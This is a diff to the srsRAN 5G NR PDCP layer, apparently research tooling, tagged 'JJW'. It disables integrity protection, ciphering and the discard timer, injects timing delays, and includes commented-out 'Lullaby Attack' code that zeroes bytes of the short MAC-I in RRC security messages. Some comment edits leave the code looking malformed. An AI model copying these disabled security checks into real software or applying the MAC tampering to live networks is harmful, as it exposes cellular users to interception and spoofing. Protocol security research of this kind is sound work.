@@ -22,6 +22,12 @@
 #include "srsran/upper/pdcp_entity_nr.h"
 #include "srsran/common/security.h"
 
+// JJW~
+#include <iostream>
+#include <string>
+#include <unistd.h>
+// ~JJW
+
 namespace srsran {
 
 pdcp_entity_nr::pdcp_entity_nr(srsue::rlc_interface_pdcp* rlc_,
@@ -126,6 +132,7 @@ void pdcp_entity_nr::write_sdu(unique_byte_buffer_t sdu, int sn)
   }
 
   // Start discard timer
+  /*
   if (cfg.discard_timer != pdcp_discard_timer_t::infinity) {
     timer_handler::unique_timer discard_timer = task_sched.get_unique_timer();
     discard_callback            discard_fnc(this, tx_next);
@@ -134,6 +141,7 @@ void pdcp_entity_nr::write_sdu(unique_byte_buffer_t sdu, int sn)
     discard_timers_map.insert(std::make_pair(tx_next, std::move(discard_timer)));
     logger.debug("Discard Timer set for SN %u. Timeout: %ums", tx_next, static_cast<uint32_t>(cfg.discard_timer));
   }
+  */
 
   // Perform header compression TODO
 
@@ -143,10 +151,16 @@ void pdcp_entity_nr::write_sdu(unique_byte_buffer_t sdu, int sn)
   // TS 38.323, section 5.9: Integrity protection
   // The data unit that is integrity protected is the PDU header
   // and the data part of the PDU before ciphering.
+  /*
   uint8_t mac[4] = {};
   if (is_srb() || (is_drb() && (integrity_direction == DIRECTION_TX || integrity_direction == DIRECTION_TXRX))) {
     integrity_generate(sdu->msg, sdu->N_bytes, tx_next, mac);
   }
+
+  // JJW~
+  std::cout << "JJW Write SDU MAC: " << std::to_string(mac[0]) << " " << std::to_string(mac[1]) << " " << std::to_string(mac[2]) << " " << std::to_string(mac[3]) << std::endl;
+  // ~JJW
+
   // Append MAC-I
   if (is_srb() || (is_drb() && (integrity_direction == DIRECTION_TX || integrity_direction == DIRECTION_TXRX))) {
     append_mac(sdu, mac);
@@ -160,9 +174,14 @@ void pdcp_entity_nr::write_sdu(unique_byte_buffer_t sdu, int sn)
     cipher_encrypt(
         &sdu->msg[cfg.hdr_len_bytes], sdu->N_bytes - cfg.hdr_len_bytes, tx_next, &sdu->msg[cfg.hdr_len_bytes]);
   }
+  */
 
   // Set meta-data for RLC AM
   sdu->md.pdcp_sn = tx_next;
+  // JJW~
+  std::cout << "SN of Write SDU: " << sdu->md.pdcp_sn << std::endl;
+  std::cout << "Msg Size: " << sdu->N_bytes << std::endl;
+  // ~JJW
 
   logger.info(sdu->msg,
               sdu->N_bytes,
@@ -176,6 +195,27 @@ void pdcp_entity_nr::write_sdu(unique_byte_buffer_t sdu, int sn)
 
   // Check if PDCP is associated with more than on RLC entity TODO
   // Write to lower layers
+  // JJW~
+  uint8_t mac[4] = {};
+  mac[0] = sdu->msg[sdu->N_bytes - 4];
+  mac[1] = sdu->msg[sdu->N_bytes - 3];
+  mac[2] = sdu->msg[sdu->N_bytes - 2];
+  mac[3] = sdu->msg[sdu->N_bytes - 1];
+  std::cout << "JJW Write SDU MAC: " << std::to_string(mac[0]) << " " << std::to_string(mac[1]) << " " << std::to_string(mac[2]) << " " << std::to_string(mac[3]) << std::endl;
+
+  /*
+  if (sdu->N_bytes == 9) {
+    std::cout << "\n\n========== Lullaby Attack ==========" << std::endl;
+    //std::cout << "Manipulating Short MAC-I of RRC Reconfiguration Message" << std::endl;
+    std::cout << "Manipulating Short MAC-I of RRC Security Mode Command" << std::endl;
+    
+    sdu->msg[sdu->N_bytes - 4] = 0;
+    sdu->msg[sdu->N_bytes - 1] = 0;
+    std::cout << "JJW Write SDU MAC (Manipulated): " << std::to_string(sdu->msg[sdu->N_bytes - 4]) << " " << std::to_string(sdu->msg[sdu->N_bytes - 3]) << " " << std::to_string(sdu->msg[sdu->N_bytes - 2]) << " " << std::to_string(sdu->msg[sdu->N_bytes - 1]) << std::endl;
+  }
+  */
+
+  // ~JJW
   rlc->write_sdu(lcid, std::move(sdu));
 
   // Increment TX_NEXT
@@ -206,7 +246,13 @@ void pdcp_entity_nr::write_pdu(unique_byte_buffer_t pdu)
   logger.debug("Rx PDCP state - RX_NEXT=%u, RX_DELIV=%u, RX_REORD=%u", rx_next, rx_deliv, rx_reord);
 
   // Extract RCVD_SN from header
+  // JJW~
   uint32_t rcvd_sn = read_data_header(pdu);
+
+  if (rcvd_sn == 6 || rcvd_sn == 7 || rcvd_sn == 8) {
+    sleep(1);
+  }
+  // ~JJW
 
   /*
    * Calculate RCVD_COUNT:
@@ -219,6 +265,7 @@ void pdcp_entity_nr::write_pdu(unique_byte_buffer_t pdu)
    *   - RCVD_HFN = HFN(RX_DELIV);
    * - RCVD_COUNT = [RCVD_HFN, RCVD_SN].
    */
+
   uint32_t rcvd_hfn, rcvd_count;
   if ((int64_t)rcvd_sn < (int64_t)SN(rx_deliv) - (int64_t)window_size) {
     rcvd_hfn = HFN(rx_deliv) + 1;
@@ -229,7 +276,32 @@ void pdcp_entity_nr::write_pdu(unique_byte_buffer_t pdu)
   }
   rcvd_count = COUNT(rcvd_hfn, rcvd_sn);
 
+  // JJW~
+  std::cout << "RCVD SN: " << rcvd_sn << std::endl;
+  std::cout << "Msg Size: " << pdu->N_bytes << std::endl;
+  // ~JJW
   logger.debug("Estimated RCVD_HFN=%u, RCVD_SN=%u, RCVD_COUNT=%u", rcvd_hfn, rcvd_sn, rcvd_count);
+
+  // JJW~
+  uint8_t mac[4] = {};
+  mac[0] = pdu->msg[pdu->N_bytes - 4];
+  mac[1] = pdu->msg[pdu->N_bytes - 3];
+  mac[2] = pdu->msg[pdu->N_bytes - 2];
+  mac[3] = pdu->msg[pdu->N_bytes - 1];
+  std::cout << "JJW Write PDU MAC: " << std::to_string(mac[0]) << " " << std::to_string(mac[1]) << " " << std::to_string(mac[2]) << " " << std::to_string(mac[3]) << std::endl;
+
+  /*
+  if (pdu->N_bytes == 8) {
+    std::cout << "\n\n========== Lullaby Attack ==========" << std::endl;
+    std::cout << "Manipulating Short MAC-I of RRC Security Mode Complete" << std::endl;
+    
+    pdu->msg[pdu->N_bytes - 4] = 0;
+    pdu->msg[pdu->N_bytes - 1] = 0;
+    std::cout << "JJW Write PDU MAC (Manipulated): " << std::to_string(pdu->msg[pdu->N_bytes - 4]) << " " << std::to_string(pdu->msg[pdu->N_bytes - 3]) << " " << std::to_string(pdu->msg[pdu->N_bytes - 2]) << " " << std::to_string(pdu->msg[pdu->N_bytes - 1]) << std::endl;
+  }
+  */
+
+  // ~JJW
 
   /*
    * TS 38.323, section 5.8: Deciphering
@@ -238,29 +310,37 @@ void pdcp_entity_nr::write_pdu(unique_byte_buffer_t pdu)
    * data part of the PDCP Data PDU except the
    * SDAP header and the SDAP Control PDU if included in the PDCP SDU.
    */
+  /*
   if (encryption_direction == DIRECTION_RX || encryption_direction == DIRECTION_TXRX) {
     cipher_decrypt(
         &pdu->msg[cfg.hdr_len_bytes], pdu->N_bytes - cfg.hdr_len_bytes, rcvd_count, &pdu->msg[cfg.hdr_len_bytes]);
   }
 
-  /*
+  
    * Extract MAC-I:
    * Always extract from SRBs, only extract from DRBs if integrity is enabled
-   */
+   
   uint8_t mac[4] = {};
   if (is_srb() || (is_drb() && (integrity_direction == DIRECTION_TX || integrity_direction == DIRECTION_TXRX))) {
     extract_mac(pdu, mac);
   }
 
-  /*
+  // JJW~
+  std::cout << "JJW Write PDU MAC: " << std::to_string(mac[0]) << " " << std::to_string(mac[1]) << " " << std::to_string(mac[2]) << " " << std::to_string(mac[3]) << std::endl;
+  // ~JJW
+
+  
    * TS 38.323, section 5.9: Integrity verification
    *
    * The data unit that is integrity protected is the PDU header
    * and the data part of the PDU before ciphering.
-   */
+   
   if (integrity_direction == DIRECTION_TX || integrity_direction == DIRECTION_TXRX) {
     bool is_valid = integrity_verify(pdu->msg, pdu->N_bytes, rcvd_count, mac);
     if (!is_valid) {
+      // JJW~
+      std::cout << "JJW Write PDU Integrity Check Failure" << std::endl;
+      // ~JJW
       logger.error(pdu->msg, pdu->N_bytes, "%s Dropping PDU", rb_name.c_str());
       rrc->notify_pdcp_integrity_error(lcid);
       return; // Invalid packet, drop.
@@ -268,17 +348,17 @@ void pdcp_entity_nr::write_pdu(unique_byte_buffer_t pdu)
       logger.debug(pdu->msg, pdu->N_bytes, "%s: Integrity verification successful", rb_name.c_str());
     }
   }
-
+  */
   // After checking the integrity, we can discard the header.
   discard_data_header(pdu);
 
-  /*
+  /* 
    * Check valid rcvd_count:
    *
    * - if RCVD_COUNT < RX_DELIV; or
    * - if the PDCP Data PDU with COUNT = RCVD_COUNT has been received before:
    *   - discard the PDCP Data PDU;
-   */
+   */ 
   if (rcvd_count < rx_deliv) {
     logger.debug("Out-of-order after time-out, duplicate or COUNT wrap-around");
     logger.debug("RCVD_COUNT %u, RCVD_COUNT %u", rcvd_count, rx_deliv);
